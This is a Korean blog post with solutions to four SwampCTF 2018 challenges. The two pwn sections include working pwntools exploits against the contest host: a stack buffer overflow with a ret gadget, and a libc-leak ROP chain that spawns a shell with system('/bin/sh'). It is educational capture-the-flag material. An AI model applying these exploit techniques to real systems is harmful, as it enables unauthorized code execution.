---
layout: post
title:  "SwampCTF 2018 Writeup"
date:   2018-04-08 17:31:13 -0400
categories: ctf
---

### The Vault (web)

문제를 들어가면 "DUNGEON_MASTER"만 들어갈 수 있다는 로그인창이 나온다. 그래서 name은 DUNGEON_MASTER, pw는 abcd를 입력하면 응답을 보낸다. 

```javascript
function login(){
	var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function() {
		if (this.readyState == 4) {
			if(this.status == 200){
				alert(xhttp.responseText);
				window.location.href = 'https://youtu.be/rWVeZx2IP30?t=3';
			} else {
				alert('Invalid Credentials')
			}
		}
	};
	xhttp.open("POST", "/login/"+document.getElementById('inputName').value+"."+document.getElementById('inputPassword').value, true);
	xhttp.send();
	return false;
}
```
위 코드때문에 /login/[InputName].[InputPW] 주소로 요청을 보내고 입력한 패스워드의 sha256 encrypt한 값과 real_hash값과 일치한지 확인한다. 따라서 real_hash값인 40f5d109272941b79fdf078a0e41477227a9b4047ca068fff6566104302169ce를 복호화하면 올바른 pw 값을 찾을 수 있다.

### Apprentice’s Return (pwn)

32bit ELF 바이너리가 주어진다. 
~~~c
read(0, &buf, 0x32u);
  if ( retaddr > &locret_8048595 ) // retaddr > 0x804895
  {
    puts("Oh no! Your actions are completely ineffective! The allip approaches and as it nears, you feel its musty breath and are paralyzed with fear. It gently caresses your cheek, and you turn and flee the dungeon, leaving the battle to be fought another day...");
    fflush(_bss_start);
    exit(0);
  }
~~~

buf 변수는 38byte 크기이지만 read 함수로 50bytes(0x32)만큼 입력받아 버퍼오버플로우 취약점이 발생한다. 하지만 위의 조건문에 의해 flag를 읽는 slayTheBeast() 함수를 실행할 수 없다. 따라서 페이로드를 다음과 같이 작성했다.
[dummy 42bytes] [SFP 4bytes] [RET gadget 4bytes] [slayTheBeast address 4bytes]
ret 주소에 slayTheBeast() 주소를 덮어쓸 경우, if문에 걸리므로, ret 가젯을 이용하여 원하는 코드를 실행한다.

```python
from pwn import *
context.log_level = 'debug'

r = remote('chal1.swampctf.com', 1802)
#r = process('./return')
#raw_input()
r.recvuntil('do: \n')
r.send('A'*42 + p32(0x8048469) + p32(0x08048615)) #'A'*42 + 'return gadget address' + 'cat flag.txt address'
r.recvuntil('might be defeated.\n')
r.recv(2048)
```

### Power QWORD (pwn)

64bit ELF 바이너리다.
~~~
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
~~~
ASLR이 존재하여 주소가 계속 변경된다. 주어진 libc.so.6 라이브러리를 이용해 offset을 계산해서 문제를 해결하면 될 것 같다.
~~~c
...

_isoc99_fscanf(stdin, "%16s", &v6);
IO_getc(stdin);
if ( v6 == 'n' )
{
  if ( v7 == 'o' && !v8 )
  {
    exit(0);
  }

}

...
  
if ( v6 != 'y' || v7 != 'e' || v8 != 's' || v9 ){
  v3 = dlopen("libc.so.6", 1);
  dlsym(v3, "system");
  _printf_chk(
  1LL,
  Take this basis [the mage hands you %p]\n ");
  fread(&retaddr, 1uLL, 8uLL, stdin);

...

~~~

main 함수 말고는 다른 기능이 있는 함수는 찾을 수 없었다. yes / no를 입력받아 no를 입력받을 경우, 프로그램이 종료되고 yes를 입력받을 경우 system 함수의 주소가 출력된다. 그리고 fread 함수를 통해 ret 주소에 덮어 쓴다. ROP를 이용해 gets 함수의 주소를 구하고 쉘을 획득하면 된다.
payload = [gets() 주소 8bytes] [pop rdi; ret; 가젯 8byets] [/bin/sh 주소] [system() 주소]
~~~python
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')

libc = ELF('libc.so.6')
#r = process('./power')
r = remote('chal1.swampctf.com', 1999)
#raw_input('debug')
r.recvuntil('(yes/no): ')
r.sendline('yes')
r.recvuntil('[the mage hands you ')

a = r.recv(14)
system_addr = int(a, 16)
log.info('system addr : 0x%x' % system_addr)

libc_addr = system_addr - libc.symbols['system']
gets_addr = libc_addr + libc.symbols['gets']
binsh_addr = libc_addr + libc.search('/bin/sh').next()
pop_rdi_addr = libc_addr + libc.search(asm('pop rdi; ret;')).next()

log.info('gets addr : 0x%x' % gets_addr)
log.info('binsh addr : 0x%x' % binsh_addr)
log.info('pop rdi addr : 0x%x' % pop_rdi_addr)

payload = p64(gets_addr)
payload += p64(pop_rdi_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)

r.recvuntil('QWord: ')
r.send(payload)
r.interactive()
~~~


### Journey (rev)

upx로 패킹된 32bit ELF 바이너리가 주어진다. 언패킹한 후, 분석해보면 입력받은 17글자 문자열과 14231234143212433의 연산을 통해 'theresanotherstep' 값이 나온다면 Flag를 구할 수 있다.
~~~c
num = 14231234143212433LL;
for ( i = 0; i < 17; i++ )
{
	v3 = num % 10;
   	num /= 10;
    s1 -= v3;
}
~~~

연산하는게 헷갈려서 gdb로 직접 분석해보며 페이로드를 작성했다.

~~~python
s1 = 'theresanotherstep'
num = '33421234143213241' #14231234143212433 reverse
flag = ''

for i in range(0, 17):
    flag += chr(ord(s1[i])+int(num[i]))

print flag
~~~